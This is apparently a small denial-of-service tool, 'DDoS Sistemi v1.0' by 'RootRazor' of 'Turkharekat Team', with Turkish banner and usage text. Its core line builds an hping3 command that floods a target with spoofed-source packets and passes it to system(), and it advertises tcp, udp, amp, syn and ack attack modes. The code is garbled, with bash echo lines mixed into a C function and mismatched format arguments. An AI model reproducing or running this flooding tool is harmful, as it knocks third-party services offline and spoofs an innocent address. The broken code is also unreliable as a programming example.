//RootRaz0r.


#include <stdio.h>
#define yesil  "\x1b[92m"
#define kirmizi "\033[0;31m"
#define mavi "\033[0;36m"
#define sari  "\x1B[33m"
int main(int argc, char **argv[]){

echo -e "     .--. " | lolcat -a -d 2
echo -e "    |o_o |	 " | lolcat -a -d 2
echo -e "    |:_/ |   ========= DDoS Sistemi v1.0 ========= " | lolcat -a -d 2
echo -e "  //   \ \  ====== Code by RootRazor ====== " | lolcat -a -d 2
echo -e " (|     | ) ====== Thanks to Turkharekat ======= " | lolcat -a -d 2
echo -e " /\'\_   _/ " | lolcat -a -d 2
echo -e " \___)=(___/ " | lolcat -a -d 2

 
# --- verilerim ---
verilerim() { 
	echo -e "\n- bu script rootrazor tarafindan kodlamistir C ve BASH olarak."  | lolcat -a -d 10
	echo -e "\n- razorscript.c bunu indiriniz"  | lolcat -a -d 10
	echo -e "\n- yukardaki scripti derlemeden kullanamazsiniz."  | lolcat -a -d 10
	echo -e "\n- Birden Fazla Method ve Katmanlarimiz Sayesinde Atak Cikarabilirsiniz ."  | lolcat -a -d 10
	echo -e "\nOrnek Kullanim:\n - ./rootrazor İP PORT tcp, udp, amp, syn, ack" | lolcat -a -d 2
	} 


if [ $# -lt 4 ] 
then
	verilerim
	exit 1
fi 
 
char aktifet[255];
printf("%s• •        Kodlama: RootRaz0r • •\n",sari,mavi,kirmizi,yesil,kirmizi,yesil,kirmizi,sari);
printf("%s• •        TurkHarekat Team     • •\n",sari,mavi,kirmizi,yesil,kirmizi,yesil,kirmizi,sari);
sprintf(aktifet,"hping3 -H -0 -A --spoof 128.65.210.118 %s -p 22 -d 50 -e 'Turkharekat Team' --flood",argv[1], argv[1]);
system(aktifet);
 
char sonlandir[255];
sprintf(sonlandir,"sleep %s && screen 0 hping3 x quit %s %s",argv[3]);
system(sonlandir);
 
}
